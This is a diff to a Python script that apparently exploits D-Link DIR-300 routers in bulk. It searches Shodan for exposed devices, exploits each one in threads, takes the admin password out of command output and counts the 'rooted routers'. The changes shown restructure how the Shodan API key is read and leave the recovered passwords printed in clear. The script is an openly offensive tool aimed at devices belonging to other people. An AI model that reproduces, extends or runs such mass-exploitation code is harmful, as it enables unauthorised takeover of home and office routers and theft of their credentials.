@@ -18,11 +18,11 @@ from os import urandom
 from time import sleep
 from pprint import pprint
 from shodan import WebAPI
-from sys import argv, stdout
+from sys import argv
 from base64 import encodestring
-from requests import get, post
 import logging
-
+import urllib2
+import urllib
 
 rooted = []
 
@@ -77,7 +77,7 @@ class Dir300(object):
     def info(self):
         res = ''
         for url in self.info_urls:
-            print('Quering %s' % url)
+            #print('Quering %s' % url)
             resp = self.do_GET(url).strip('\n\n')
             res += resp
             #print resp
@@ -127,7 +127,6 @@ class DlinkThread(Thread):
                 cmdout = d.command(self.cmd).strip()
                 if cmdout != '':
                     pwd = cmdout.split(' ')[1].replace('"', '')
-                    #cmdout = 'admin:'+ pwd[1] + '*'*len(pwd)-2 + pwd[-1:]
                     cmdout = 'admin:'+ pwd
                     #be ethical
                     #cmdout = '*'*len(pwd)
@@ -174,14 +173,7 @@ def exploit(host, port=80):
 
 def autoroot(api_key, thread_count=10):
 
-        # Don't bother to register and get it.
-        api_key = raw_input("Shodan API Key: ")
-        if api_key is None or len(api_key) == 0:
-            print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
-            exit()
-
-        try:
-            api = WebAPI(api_key)
+        api = WebAPI(api_key)
         search_queries = ['Server: Linux, HTTP/1.1, DIR','Mathopd/1.5p6' ]#, 'Server: Linux, HTTP/1.1, DIR-300']
         for query in search_queries:
             count = 0
@@ -203,13 +195,18 @@ def autoroot(api_key, thread_count=10):
                 if count == total:
                     break
 
-        print("Rooted routers count: %i"%len(rooted))
+        print("Rooted routers count: %i" % len(rooted))
         print(rooted)
 
 if __name__ == '__main__':
-
     if len(argv) == 1:
         print('No args found, try to query Shodan...')
+        api_key = raw_input("Shodan API Key: ")
+        if api_key is None or len(api_key) == 0:
+            print('Go and get SHODAN_API_KEY at http://www.shodanhq.com/')
+            exit()
+
+        autoroot(api_key)
     else:
         port = 80
         if len(argv) > 2:
